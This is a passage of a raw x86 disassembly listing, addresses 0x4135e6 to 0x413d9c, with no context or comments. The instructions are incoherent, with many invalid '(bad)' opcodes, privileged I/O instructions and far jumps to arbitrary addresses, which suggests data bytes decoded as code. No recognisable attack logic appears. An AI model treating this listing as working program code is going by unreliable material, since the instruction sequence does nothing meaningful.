  4135e6:	and    eax,0x3755ccd5
  4135eb:	(bad)  
  4135ec:	retf   
  4135ed:	mov    ebx,0x3d0cb704
  4135f2:	pop    es
  4135f3:	mov    ds:0x3a0e2412,al
  4135f8:	fldlg2 
  4135fa:	test   BYTE PTR [edx+ecx*4-0xf1d5b61],al
  413601:	sbb    al,0xd8
  413603:	push   esp
  413604:	call   0xe580c019
  413609:	cwde   
  41360a:	fwait
  41360b:	bound  ecx,QWORD PTR [edx]
  41360d:	and    ebp,DWORD PTR [edx-0x57]
  413610:	xchg   ebx,eax
  413611:	repz div BYTE PTR [ebx+0x43]
  413615:	dec    edx
  413616:	into   
  413617:	add    al,0x98
  413619:	mov    ecx,esp
  41361b:	stos   BYTE PTR es:[edi],al
  41361c:	xchg   ecx,eax
  41361d:	sub    al,0x10
  41361f:	(bad)  
  413620:	into   
  413621:	adc    eax,0x8a269a63
  413626:	lods   al,BYTE PTR ds:[esi]
  413627:	outs   dx,DWORD PTR ds:[esi]
  413628:	and    al,0xdc
  41362a:	or     BYTE PTR [eax],0x99
  41362d:	inc    edi
  41362e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41362f:	enter  0xcb4e,0xde
  413633:	mov    BYTE PTR [eax-0x52f55d52],ch
  413639:	sub    DWORD PTR [ecx-0x4f64005c],ebx
  41363f:	pop    ds
  413640:	adc    edx,DWORD PTR [ebx-0x6e]
  413643:	daa    
  413644:	(bad)  
  413645:	lahf   
  413646:	(bad)  
  413647:	push   edi
  413648:	stos   BYTE PTR es:[edi],al
  413649:	and    DWORD PTR ss:[ebx],edx
  41364c:	pavgb  mm7,QWORD PTR ds:0x98c5e7d9
  413653:	pop    es
  413654:	push   edi
  413655:	inc    esi
  413656:	fwait
  413657:	mov    ch,0x28
  413659:	int3   
  41365a:	lock loop 0x4135ed
  41365d:	sub    al,0x2
  41365f:	jns    0x413624
  413661:	pop    ebp
  413662:	or     eax,ecx
  413664:	and    al,0x5c
  413666:	mov    ch,0x6d
  413668:	pop    edx
  413669:	dec    edi
  41366a:	xchg   edx,eax
  41366b:	(bad)  
  41366c:	push   cs
  41366d:	dec    edi
  41366e:	(bad)  
  41366f:	pop    ebx
  413670:	mov    ch,0x9a
  413672:	adc    eax,0x23e19d72
  413677:	lea    esi,[eax-0x32]
  41367a:	ja     0x413690
  41367c:	or     eax,0xd99a0c69
  413681:	pop    esi
  413682:	sub    ch,BYTE PTR [edi]
  413684:	mov    eax,0xc3c25377
  413689:	stos   BYTE PTR es:[edi],al
  41368a:	je     0x413680
  41368c:	ins    DWORD PTR es:[edi],dx
  41368d:	and    eax,0x4c4cb777
  413692:	jl     0x4136f8
  413694:	test   ah,0xf5
  413697:	hlt    
  413698:	pop    es
  413699:	jnp    0x413657
  41369b:	daa    
  41369c:	sar    DWORD PTR [edi-0x2b055955],1
  4136a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136a3:	sub    dh,0x40
  4136a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136a7:	xor    eax,0x9b88c8b9
  4136ac:	lds    eax,FWORD PTR [ecx]
  4136ae:	or     bl,BYTE PTR fs:[ebp+0x6d]
  4136b2:	icebp  
  4136b3:	test   al,0x70
  4136b5:	cmp    edx,edi
  4136b7:	inc    edx
  4136b8:	mov    WORD PTR [ecx-0x19],ss
  4136bb:	xor    eax,0xce259103
  4136c0:	and    dl,BYTE PTR [ebp+0x6c]
  4136c3:	shl    BYTE PTR [esi+0x34234cd8],1
  4136c9:	xchg   ebp,eax
  4136ca:	arpl   WORD PTR [edx-0x1cd4d86d],dx
  4136d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136d2:	shl    BYTE PTR [edi-0x3a70ea2],cl
  4136d8:	ins    DWORD PTR es:[edi],dx
  4136d9:	and    eax,0x263ac34c
  4136de:	add    al,0xb1
  4136e0:	inc    esp
  4136e1:	and    bl,BYTE PTR [ebp-0x1d]
  4136e4:	adc    al,0x7d
  4136e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e7:	pop    ds
  4136e8:	addr16 dec ebx
  4136ea:	mov    DWORD PTR [ebp+0x6ac570a7],ebp
  4136f0:	dec    ecx
  4136f1:	cmp    eax,0xb4edabab
  4136f6:	adc    ecx,DWORD PTR [edi]
  4136f8:	outs   dx,DWORD PTR ds:[esi]
  4136f9:	loop   0x413700
  4136fb:	push   edi
  4136fc:	test   al,0x4e
  4136fe:	aad    0x6e
  413700:	mov    edi,0x5c51ec9b
  413705:	scas   eax,DWORD PTR es:[edi]
  413706:	imul   eax,DWORD PTR [ebp-0x7cef20db],0x61
  41370d:	mov    dl,0x17
  41370f:	clc    
  413710:	cld    
  413711:	int3   
  413712:	dec    ebp
  413713:	xor    al,0x32
  413715:	shl    BYTE PTR ds:0xd57095a0,0xf3
  41371c:	sub    DWORD PTR [eax+0x10b53e8],ebx
  413722:	push   ds
  413723:	xor    ah,ch
  413725:	xchg   ebp,eax
  413726:	inc    ebp
  413727:	jne    0x413758
  413729:	lea    edx,[ecx+0x5c20fab0]
  41372f:	mov    al,ds:0x13cc16dc
  413734:	lahf   
  413735:	fcom   DWORD PTR [ecx+ecx*4]
  413738:	loop   0x413748
  41373a:	in     al,0x5d
  41373c:	rcl    BYTE PTR [edx],cl
  41373e:	sbb    ecx,DWORD PTR [edi+0x425ae838]
  413744:	sub    edi,DWORD PTR [edi]
  413746:	mov    edx,0x988cfa1b
  41374b:	arpl   dx,bp
  41374d:	loope  0x4136f7
  41374f:	xor    BYTE PTR [esi],ch
  413751:	sbb    bl,bl
  413753:	loopne 0x413728
  413755:	mov    ss,ebx
  413757:	mov    al,0xc5
  413759:	mov    bh,0x7d
  41375b:	std    
  41375c:	frstor [eax]
  41375e:	xlat   BYTE PTR ds:[ebx]
  41375f:	(bad)  
  413760:	dec    ebp
  413761:	pop    ebp
  413762:	in     al,0x10
  413764:	ja     0x41377e
  413766:	mov    edi,DWORD PTR [ebp+esi*1-0x2b]
  41376a:	adc    dh,ch
  41376c:	pop    edx
  41376d:	loopne 0x413775
  41376f:	jmp    0x11bc:0x32a98516
  413776:	in     eax,dx
  413777:	das    
  413778:	add    al,0x5c
  41377a:	inc    ebx
  41377b:	das    
  41377c:	mov    ds:0xe0c9bea,eax
  413781:	jge    0x413704
  413783:	lods   al,BYTE PTR ds:[esi]
  413784:	pop    ebp
  413785:	outs   dx,BYTE PTR ds:[esi]
  413786:	push   edi
  413787:	xchg   ebp,eax
  413788:	jno    0x4137f6
  41378a:	cmp    bh,dl
  41378c:	je     0x4137f3
  41378e:	mov    cl,0x65
  413790:	inc    edi
  413791:	sbb    BYTE PTR [ebx],ch
  413793:	push   es
  413794:	xor    eax,0xc9973635
  413799:	adc    DWORD PTR [esi],edi
  41379b:	or     dl,ch
  41379d:	inc    edx
  41379e:	in     eax,dx
  41379f:	jmp    0x41381b
  4137a1:	mov    dl,0x68
  4137a3:	xor    al,0xeb
  4137a5:	add    dh,BYTE PTR [esi-0x6fa92a0f]
  4137ab:	test   eax,0x4730f22c
  4137b0:	enter  0x8c1,0xd4
  4137b4:	sub    DWORD PTR [ecx+0x3d164d77],esp
  4137ba:	es push ds
  4137bc:	mov    WORD PTR [esp+esi*8-0x4d],cs
  4137c0:	adc    DWORD PTR [edi+0xb6c78b5],ecx
  4137c6:	and    eax,0x58b4b797
  4137cb:	adc    cl,dh
  4137cd:	pushf  
  4137ce:	add    ecx,DWORD PTR ds:[ecx]
  4137d1:	sbb    al,0xdb
  4137d3:	(bad)  
  4137d4:	mov    eax,0xf68d2f3f
  4137d9:	xor    eax,0xbe3f172c
  4137de:	aaa    
  4137df:	mov    esi,0x8112e1b8
  4137e4:	gs dec edi
  4137e6:	or     BYTE PTR [eax*1-0x1daee804],ah
  4137ed:	aaa    
  4137ee:	das    
  4137ef:	jno    0x413869
  4137f1:	aas    
  4137f2:	pop    esp
  4137f3:	cdq    
  4137f4:	and    dh,BYTE PTR [esi+0x1fd3a41c]
  4137fa:	xchg   edx,eax
  4137fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137fc:	dec    ecx
  4137fd:	fdivr  QWORD PTR [esi+0x3c]
  413800:	mov    ds:0x22f94567,eax
  413805:	ins    DWORD PTR es:[edi],dx
  413806:	out    0x4e,al
  413808:	arpl   WORD PTR [ebx+eiz*2+0x3a33f376],dx
  41380f:	sti    
  413810:	add    eax,0x3c1e858
  413815:	add    eax,0xaadffa51
  41381a:	mov    bh,0xeb
  41381c:	das    
  41381d:	test   BYTE PTR [esi+0x17463860],0xd
  413824:	jns    0x413865
  413826:	jle    0x413892
  413828:	retf   
  413829:	inc    edi
  41382a:	jno    0x4137b7
  41382c:	pushf  
  41382d:	jno    0x413812
  41382f:	adc    BYTE PTR [esi+ecx*1-0x115eca2],ah
  413836:	pop    edi
  413837:	in     eax,0x4
  413839:	(bad)  
  41383a:	sti    
  41383b:	fist   WORD PTR [edi+0x42]
  41383e:	pop    ecx
  41383f:	or     esp,DWORD PTR [edx]
  413841:	inc    ebp
  413842:	xor    DWORD PTR [edx-0xa0505f3],esi
  413848:	(bad)  
  41384a:	mov    ecx,0x808a9ad
  41384f:	dec    ecx
  413850:	cs push 0x2e
  413853:	cdq    
  413854:	xchg   ax,ax
  413856:	jg     0x413874
  413858:	or     DWORD PTR [ecx-0x147687a4],ebp
  41385e:	out    0x51,al
  413860:	xchg   BYTE PTR gs:[ebp+0x2111365],bh
  413867:	sbb    BYTE PTR [ecx-0x28],al
  41386a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41386b:	repnz frstor [eax+0x3c]
  41386f:	cmp    al,0x7b
  413871:	scas   eax,DWORD PTR es:[edi]
  413872:	xor    edi,DWORD PTR [edx-0x7b]
  413875:	cdq    
  413876:	adc    eax,0x58bac601
  41387b:	mov    WORD PTR [eax+0x2d],gs
  41387e:	js     0x4138b7
  413880:	adc    edx,ebp
  413882:	bound  ebx,QWORD PTR [eax]
  413884:	mov    ah,0xea
  413886:	stos   BYTE PTR es:[edi],al
  413887:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413889:	jmp    0x6e41f00e
  41388e:	mov    al,0x20
  413890:	(bad)  
  413891:	aad    0x29
  413893:	call   0x3594a165
  413898:	cmp    BYTE PTR [esi],0x40
  41389b:	sub    ah,BYTE PTR [esi]
  41389d:	sub    ebp,ebx
  41389f:	jb     0x413856
  4138a1:	mov    ebx,0x1a596328
  4138a6:	push   ecx
  4138a7:	inc    edx
  4138a8:	fs mov dh,0xa6
  4138ab:	int3   
  4138ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138ad:	stos   BYTE PTR es:[edi],al
  4138ae:	ss gs pop ss
  4138b1:	mov    ch,0x41
  4138b3:	push   ds
  4138b4:	mov    cl,0xb4
  4138b6:	retf   
  4138b7:	dec    esi
  4138b8:	(bad)  
  4138b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ba:	mov    ah,0x14
  4138bc:	ret    0xcc9a
  4138bf:	mov    esp,0xd869d0fe
  4138c4:	js     0x413857
  4138c6:	fimul  DWORD PTR [ecx-0x44]
  4138c9:	in     eax,0x30
  4138cb:	ret    
  4138cc:	rcr    BYTE PTR ds:0x6d0140e0,0x13
  4138d3:	push   ds
  4138d4:	sub    al,0x8f
  4138d6:	in     eax,0x3
  4138d8:	xchg   ebx,eax
  4138d9:	sub    edi,edi
  4138db:	loope  0x41386b
  4138dd:	inc    ebx
  4138de:	adc    al,bl
  4138e0:	jbe    0x41389a
  4138e2:	rcr    DWORD PTR [edi],1
  4138e4:	mov    al,ds:0xf6274260
  4138e9:	xchg   ebp,eax
  4138ea:	into   
  4138eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ec:	dec    esi
  4138ed:	or     BYTE PTR [ebx-0x5a],dh
  4138f0:	sbb    DWORD PTR [ebp-0x4b],ebx
  4138f3:	cmp    eax,0x594cb4fb
  4138f8:	pushf  
  4138f9:	jg     0x4138ca
  4138fb:	pushf  
  4138fc:	or     DWORD PTR [ebx-0x49],ecx
  4138ff:	into   
  413900:	mov    eax,ebx
  413902:	loopne 0x413936
  413904:	and    ah,BYTE PTR [edx-0x11]
  413907:	mov    ah,0x50
  413909:	xor    ch,ah
  41390b:	test   al,0x92
  41390d:	inc    esi
  41390e:	mov    WORD PTR fs:[edx+0x307557b1],?
  413915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413916:	dec    ebp
  413917:	fs inc edi
  413919:	bound  edx,QWORD PTR [esi+0x374d4146]
  41391f:	xor    BYTE PTR [esi+0x15],al
  413922:	in     al,dx
  413923:	mov    edx,DWORD PTR ds:0x2faf5fba
  413929:	ss fsubp st(4),st
  41392c:	and    BYTE PTR [edi-0x7a],bl
  41392f:	or     edi,DWORD PTR [edx]
  413931:	inc    edi
  413932:	fisttp WORD PTR [esi+edi*8]
  413935:	push   bp
  413937:	jb     0x413973
  413939:	mov    ebx,0x951e9e62
  41393e:	cmp    eax,0x2fd01983
  413943:	test   al,0x11
  413945:	inc    edx
  413946:	add    eax,0xf8d72692
  41394b:	sub    eax,0xeff2b129
  413950:	and    edx,ecx
  413952:	mul    DWORD PTR [edi]
  413954:	add    ch,ch
  413956:	clc    
  413957:	push   ds
  413958:	jmp    0x4139a9
  41395a:	pop    esi
  41395b:	xchg   ebx,eax
  41395c:	fsubr  DWORD PTR [ebx-0x4d]
  41395f:	xchg   edx,eax
  413960:	lock add cl,dl
  413963:	scas   eax,DWORD PTR es:[edi]
  413964:	enter  0xe385,0x24
  413968:	stos   BYTE PTR es:[edi],al
  413969:	push   edi
  41396a:	add    cl,BYTE PTR [eax]
  41396c:	pop    ebp
  41396d:	rcl    BYTE PTR [ebx-0x1cf0cc4a],cl
  413973:	out    dx,eax
  413974:	test   DWORD PTR [edx],ecx
  413976:	sbb    al,0xaf
  413978:	int3   
  413979:	xchg   DWORD PTR [esi-0x77],edi
  41397c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41397d:	jmp    0x41391a
  41397f:	xor    al,0xa6
  413981:	mov    ebp,0xda563111
  413986:	cmp    ecx,DWORD PTR [ebp-0x78]
  413989:	mov    bh,0xb
  41398b:	jp     0x4139f1
  41398d:	jge    0x4139b9
  41398f:	add    al,0x61
  413991:	adc    eax,0xa4652dc9
  413996:	dec    ebx
  413997:	mov    eax,0x26a48115
  41399c:	mov    dl,0x73
  41399e:	(bad)  
  41399f:	adc    esi,DWORD PTR ds:0x8e6c36d6
  4139a5:	cmp    DWORD PTR ss:[esp+ebp*8+0x34],0xffffffe8
  4139ab:	dec    edx
  4139ac:	push   ss
  4139ad:	mov    esp,ss
  4139af:	mul    BYTE PTR [edx]
  4139b1:	shl    cl,cl
  4139b3:	jecxz  0x413968
  4139b5:	cli    
  4139b6:	fild   DWORD PTR [eax]
  4139b8:	push   ebx
  4139b9:	inc    ebx
  4139ba:	jo     0x4139fd
  4139bc:	aam    0xb6
  4139be:	mov    al,0x78
  4139c0:	xchg   DWORD PTR [ecx+0x2b95ca81],esi
  4139c6:	dec    eax
  4139c7:	int3   
  4139c8:	and    dh,BYTE PTR [edx-0x79]
  4139cb:	inc    edi
  4139cc:	rcr    BYTE PTR fs:[eax],1
  4139cf:	outs   dx,BYTE PTR ds:[esi]
  4139d0:	retf   0x43a6
  4139d3:	push   esi
  4139d4:	sub    eax,0x6c3f580e
  4139d9:	int    0xfb
  4139db:	xor    DWORD PTR [ecx+esi*8],ebp
  4139de:	idiv   BYTE PTR ds:0x6de5ad62
  4139e4:	enter  0xe536,0x3b
  4139e8:	leave  
  4139e9:	mov    dl,0x5b
  4139eb:	mov    bh,0xa0
  4139ed:	dec    ebx
  4139ee:	enter  0x5c40,0xf6
  4139f2:	sub    eax,DWORD PTR [ebp+0x69]
  4139f5:	repz pop eax
  4139f7:	icebp  
  4139f8:	jg     0x4139d2
  4139fa:	aad    0x66
  4139fc:	shl    eax,1
  4139fe:	inc    edi
  4139ff:	mov    ebp,ds
  413a01:	lods   al,BYTE PTR ds:[esi]
  413a02:	sub    eax,0x939b2688
  413a07:	test   BYTE PTR [esi],cl
  413a09:	ss sub eax,0x513ca141
  413a0f:	or     DWORD PTR ds:0x69039657,ecx
  413a15:	cmp    edi,DWORD PTR [edx]
  413a17:	in     al,0xcd
  413a19:	add    DWORD PTR [ecx-0x4b6b931d],edx
  413a1f:	push   DWORD PTR ds:0x9173d7aa
  413a25:	mov    ds:0xbef8a508,al
  413a2a:	jne    0x4139b8
  413a2c:	mov    al,0xec
  413a2e:	daa    
  413a2f:	leave  
  413a30:	pop    edx
  413a31:	fmul   DWORD PTR [ecx-0x1aa2d700]
  413a37:	inc    eax
  413a38:	lock xor DWORD PTR [ebp-0x4fed1713],0xffffff8b
  413a40:	mov    ch,0xd6
  413a42:	mov    ecx,0x1790cacc
  413a47:	mov    bl,BYTE PTR [ebx+ecx*1]
  413a4a:	push   esi
  413a4b:	xor    ecx,esi
  413a4d:	fiadd  WORD PTR [eax-0x6bbbaeeb]
  413a53:	mov    al,0x4d
  413a55:	pop    eax
  413a56:	retf   0xf1c8
  413a59:	inc    ebx
  413a5a:	repnz push esp
  413a5c:	cli    
  413a5d:	mov    ah,0x4
  413a5f:	fs call 0xb8f7fb52
  413a65:	call   0xb88e8e87
  413a6a:	or     edx,DWORD PTR [eax]
  413a6c:	hlt    
  413a6d:	push   ss
  413a6e:	inc    edi
  413a6f:	adc    ecx,edi
  413a71:	or     edi,DWORD PTR [ebx-0x3db53115]
  413a77:	sub    al,0xb
  413a79:	pop    esp
  413a7a:	sub    ch,BYTE PTR [ebp+0x3f]
  413a7d:	outs   dx,DWORD PTR ds:[esi]
  413a7e:	sti    
  413a7f:	xchg   DWORD PTR [ebx+0x12],eax
  413a82:	push   0xfffffffc
  413a84:	rol    DWORD PTR [edi+0x564994f6],1
  413a8a:	jnp    0x413a60
  413a8c:	lea    edi,[esi-0x67a6112]
  413a92:	push   eax
  413a93:	adc    BYTE PTR [ecx+eiz*1],dh
  413a96:	xor    esi,ecx
  413a98:	popf   
  413a99:	jb     0x413abf
  413a9b:	out    0x7e,eax
  413a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a9e:	imul   ecx,edx,0xfffffffb
  413aa1:	xsha1  (bad)
  413aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aa3:	dec    ecx
  413aa4:	retf   
  413aa5:	and    al,0xdf
  413aa7:	out    0xa8,al
  413aa9:	clc    
  413aaa:	pop    ebp
  413aab:	arpl   WORD PTR [ecx-0x63],cx
  413aae:	inc    ebp
  413aaf:	xchg   DWORD PTR [eax-0x5b],ebx
  413ab2:	fsub   QWORD PTR ds:0xb8dd09b0
  413ab8:	inc    edi
  413ab9:	mov    ecx,0xd1fc3b98
  413abe:	cmc    
  413abf:	adc    ecx,DWORD PTR [ecx-0x5b]
  413ac2:	xchg   BYTE PTR [ebp-0x73ece87e],bl
  413ac8:	cmp    BYTE PTR [esi+0x19],bl
  413acb:	mov    al,ds:0x7a481d2d
  413ad0:	mov    dl,0x10
  413ad2:	repz sbb BYTE PTR [esi+0x3174f9fc],bl
  413ad9:	mov    ebx,0x896ecaaa
  413ade:	xchg   edx,eax
  413adf:	mov    ch,0x2d
  413ae1:	mov    dh,0x4a
  413ae3:	gs fcos 
  413ae6:	shr    BYTE PTR [ecx+0x47],1
  413ae9:	fdiv   QWORD PTR [ecx]
  413aeb:	dec    ebp
  413aec:	ds dec eax
  413aee:	sbb    eax,0xeceb5bac
  413af3:	or     al,0x14
  413af5:	ds mov bh,0x41
  413af8:	(bad)  
  413af9:	fisttp QWORD PTR [eax]
  413afb:	dec    eax
  413afc:	inc    esp
  413afd:	jno    0x413a95
  413aff:	sub    edi,edx
  413b01:	cmp    DWORD PTR [ebp+0x43],esi
  413b04:	mov    ecx,0xb7549bbe
  413b09:	or     eax,0xf82e339e
  413b0e:	sbb    DWORD PTR [edi+0x61],ebx
  413b11:	cmp    eax,DWORD PTR [ebx*4-0x78810a33]
  413b18:	dec    ecx
  413b19:	inc    esi
  413b1a:	add    esp,DWORD PTR [ecx]
  413b1c:	xor    dl,BYTE PTR [edi+0x28]
  413b1f:	sahf   
  413b20:	xor    BYTE PTR [esi+0x7],dh
  413b23:	shr    BYTE PTR [ebx+0x32],cl
  413b26:	add    esi,DWORD PTR [ebp+0x41900f18]
  413b2c:	loop   0x413b39
  413b2e:	cmp    ebx,eax
  413b30:	inc    eax
  413b31:	repnz mov esi,fs
  413b34:	add    al,BYTE PTR [esi+0x6da13993]
  413b3a:	scas   al,BYTE PTR es:[edi]
  413b3b:	call   0x884e:0x8d4bd0db
  413b42:	push   es
  413b43:	sbb    al,0x7b
  413b45:	mov    al,0x1a
  413b47:	lock ret 0xbb40
  413b4b:	sbb    dl,BYTE PTR [esi-0x3fb6e944]
  413b51:	mov    ebx,0xc05d9621
  413b56:	ins    DWORD PTR es:[edi],dx
  413b57:	cmp    cl,BYTE PTR [ebx+ebx*1]
  413b5a:	(bad)
  413b5e:	jl     0x413b0d
  413b60:	sub    edi,edi
  413b62:	cmp    al,0x30
  413b64:	ss jecxz 0x413b2f
  413b67:	add    eax,0xd0c74628
  413b6c:	pop    ss
  413b6d:	loope  0x413b17
  413b6f:	pop    ds
  413b70:	clc    
  413b71:	leave  
  413b72:	or     al,0x4f
  413b74:	adc    DWORD PTR [esi+0x73],0x6e
  413b78:	mov    ebx,0x9bacb96c
  413b7d:	int    0xe
  413b7f:	inc    ecx
  413b80:	pop    edx
  413b81:	mov    ch,0x92
  413b83:	dec    esp
  413b84:	xchg   BYTE PTR [edx+0x5041b65],bl
  413b8a:	retf   0x1eb4
  413b8d:	inc    esi
  413b8e:	xor    eax,0xdb699443
  413b93:	jmp    0x413b3b
  413b95:	ret    0x9849
  413b98:	push   ds
  413b99:	dec    esi
  413b9a:	cmp    ecx,DWORD PTR ds:0x269f01a9
  413ba0:	add    eax,0x72404b7d
  413ba5:	dec    eax
  413ba6:	add    ah,ah
  413ba8:	daa    
  413ba9:	call   0xf32e:0xe37c2abe
  413bb0:	dec    edi
  413bb1:	cdq    
  413bb2:	mov    BYTE PTR [ecx-0x43],al
  413bb5:	sub    edi,DWORD PTR [ecx]
  413bb7:	(bad)  
  413bb8:	sub    dl,BYTE PTR [esi]
  413bba:	pop    ss
  413bbb:	xchg   esp,eax
  413bbc:	bswap  esi
  413bbe:	out    dx,eax
  413bbf:	mov    edx,edi
  413bc1:	dec    ebx
  413bc2:	mov    edx,0x201eae8b
  413bc7:	dec    esi
  413bc8:	cmp    al,0x6d
  413bca:	pop    ds
  413bcb:	adc    eax,0xd709a015
  413bd0:	pop    edx
  413bd1:	mov    esi,0xc4d6bdaa
  413bd6:	jbe    0x413c0f
  413bd8:	sbb    DWORD PTR [eax],0xe9abb45d
  413bde:	(bad)  
  413bdf:	sahf   
  413be0:	popf   
  413be1:	sahf   
  413be2:	out    0x4f,al
  413be4:	push   ebp
  413be5:	in     al,0x71
  413be7:	scas   eax,DWORD PTR es:[edi]
  413be8:	xchg   ecx,eax
  413be9:	pop    es
  413bea:	sub    eax,DWORD PTR ds:0xe2efce21
  413bf0:	imul   esp,DWORD PTR [eax+0x77],0xfffffff2
  413bf4:	imul   esi,esi,0x9
  413bf7:	fwait
  413bf8:	mov    WORD PTR [esi-0x76112a26],?
  413bfe:	dec    eax
  413bff:	xchg   DWORD PTR [edx],ecx
  413c01:	xchg   BYTE PTR [eax+0x73],bl
  413c04:	mov    edx,ebp
  413c06:	mov    esi,gs
  413c08:	stc    
  413c09:	push   ss
  413c0a:	ins    DWORD PTR es:[edi],dx
  413c0b:	jle    0x413c71
  413c0d:	fincstp 
  413c0f:	sub    eax,0xc652b2d6
  413c14:	nop
  413c15:	out    dx,eax
  413c16:	sbb    BYTE PTR [edi-0x42],bh
  413c19:	out    dx,al
  413c1a:	xchg   BYTE PTR [eax+0x47],cl
  413c1d:	mov    ecx,0x6b45f6cd
  413c22:	aas    
  413c23:	ds hlt 
  413c25:	in     al,dx
  413c26:	jge    0x413ca7
  413c28:	xchg   BYTE PTR [ebx+ebp*4+0x4b],ch
  413c2c:	fld    TBYTE PTR ds:0x10cadbed
  413c32:	ja     0x413c89
  413c34:	mov    ah,cl
  413c36:	loopne 0x413c9d
  413c38:	in     al,0x95
  413c3a:	ret    0x6342
  413c3d:	push   esp
  413c3e:	sbb    DWORD PTR [edi-0x5580922e],0xefe60cc0
  413c48:	xchg   DWORD PTR [ebx+0x66296584],ebx
  413c4e:	cmp    bl,BYTE PTR [esi]
  413c50:	xor    esi,DWORD PTR [ebp+edx*2-0x66c78088]
  413c57:	xchg   edx,eax
  413c58:	out    0x68,al
  413c5a:	mov    ch,0xf7
  413c5c:	xchg   ebx,eax
  413c5d:	xor    DWORD PTR [ecx-0x1d69d90e],0xffffffaa
  413c64:	adc    DWORD PTR [esi+0x41],esi
  413c67:	jo     0x413c70
  413c69:	mov    bh,0x9a
  413c6b:	mov    esp,0xceb1fb08
  413c70:	rcl    BYTE PTR ds:0x132db275,0x42
  413c77:	add    edi,edi
  413c79:	mov    eax,0xc9371be4
  413c7e:	xor    al,0x59
  413c80:	mov    dl,0x9b
  413c82:	test   BYTE PTR [edi-0x32],bl
  413c85:	scas   al,BYTE PTR es:[edi]
  413c86:	out    0x4c,eax
  413c88:	inc    esi
  413c89:	shl    DWORD PTR [ebx-0x4e94dbc7],cl
  413c8f:	scas   eax,DWORD PTR es:[edi]
  413c90:	sub    eax,0x895848c7
  413c95:	pop    edx
  413c96:	std    
  413c97:	adc    BYTE PTR [ecx-0x16818a5a],dh
  413c9d:	cmp    dl,BYTE PTR [edx]
  413c9f:	xchg   BYTE PTR [edi],dl
  413ca1:	cmc    
  413ca2:	xor    al,0xc
  413ca4:	nop
  413ca5:	jo     0x413c63
  413ca7:	push   eax
  413ca8:	pop    edx
  413ca9:	retf   0x60cf
  413cac:	xor    esp,esi
  413cae:	cmp    edi,edx
  413cb0:	dec    eax
  413cb1:	sub    bh,BYTE PTR [ecx]
  413cb3:	or     al,0x8f
  413cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cb6:	es (bad) 
  413cb8:	adc    ebp,DWORD PTR ds:0x3b261681
  413cbe:	imul   ebx,DWORD PTR [ebx+ebp*4+0x12],0xffffffc7
  413cc3:	addr16 mov fs,edi
  413cc6:	pop    edx
  413cc7:	fldcw  WORD PTR [esi+edi*2]
  413cca:	cs ret 
  413ccc:	dec    esi
  413ccd:	(bad)  
  413cce:	(bad)  
  413cd0:	sti    
  413cd1:	mov    eax,0x11a9c3d9
  413cd6:	xor    eax,0x5d4e36cd
  413cdb:	xchg   edi,eax
  413cdc:	pop    edi
  413cdd:	cs dec edi
  413cdf:	sub    bl,BYTE PTR [esi+ecx*4-0x18]
  413ce3:	rol    DWORD PTR [ebx+0x47],0xea
  413ce7:	xor    BYTE PTR [edi+0x6a2229b7],bl
  413ced:	imul   esp,esi,0xffffff9f
  413cf0:	out    0x81,eax
  413cf2:	inc    eax
  413cf3:	dec    esp
  413cf4:	sub    al,0x2b
  413cf6:	push   edi
  413cf7:	stos   BYTE PTR es:[edi],al
  413cf8:	or     ecx,DWORD PTR [ebx+0x6582e700]
  413cfe:	sbb    eax,0x3b075d3f
  413d03:	(bad)  
  413d04:	xor    ch,dh
  413d06:	sbb    DWORD PTR [ecx],eax
  413d08:	mov    ch,0xd5
  413d0a:	sbb    ch,0xe8
  413d0d:	push   es
  413d0e:	sub    ecx,DWORD PTR [edi]
  413d10:	pop    es
  413d11:	lea    ebp,[esi]
  413d13:	mov    esp,0x65df1194
  413d18:	stc    
  413d19:	mov    WORD PTR [ecx],es
  413d1b:	in     eax,0x72
  413d1d:	test   DWORD PTR ds:0x64c85a4d,esi
  413d23:	xlat   BYTE PTR ds:[ebx]
  413d24:	lahf   
  413d25:	mov    ecx,0x37224ecd
  413d2a:	mov    dh,0xf2
  413d2c:	pusha  
  413d2d:	xor    DWORD PTR [eax],esp
  413d2f:	lea    esi,[ecx+edx*8-0x599b50e6]
  413d36:	jmp    0x16a2:0xea8f18
  413d3d:	lock nop
  413d3f:	(bad)  
  413d41:	(bad)  
  413d42:	xor    al,0x2c
  413d44:	(bad)
  413d47:	lea    edi,[ebx]
  413d49:	add    eax,0xf1ab2488
  413d4e:	icebp  
  413d4f:	jg     0x413d3c
  413d51:	retf   
  413d52:	jp     0x413d6f
  413d54:	and    BYTE PTR [edx+eax*1+0x1fe932d4],dh
  413d5b:	add    ebp,DWORD PTR [eax]
  413d5d:	xchg   edi,eax
  413d5e:	dec    eax
  413d5f:	addr16 pop eax
  413d61:	in     eax,dx
  413d62:	clc    
  413d63:	call   0x233945c7
  413d68:	je     0x413d48
  413d6a:	mov    esp,0x945baa80
  413d6f:	jecxz  0x413de2
  413d71:	mov    cs,WORD PTR [edi-0x6a]
  413d74:	pop    ss
  413d75:	hlt    
  413d76:	and    dl,al
  413d78:	imul   ecx,edi,0x66
  413d7b:	shl    BYTE PTR [ecx],cl
  413d7d:	out    0x13,al
  413d7f:	push   cs
  413d80:	and    DWORD PTR [esp+eax*8],ebx
  413d83:	fstp   QWORD PTR [ebp+0x4b]
  413d86:	bound  ebx,QWORD PTR [edi]
  413d88:	dec    ebx
  413d89:	mov    eax,ds:0x1aec08c7
  413d8e:	dec    edx
  413d8f:	inc    eax
  413d90:	add    BYTE PTR [esi+ecx*2],ch
  413d93:	sub    eax,esp
  413d95:	je     0x413d7c
  413d97:	sub    eax,0x4e7d0f1c
  413d9c:	push   edi
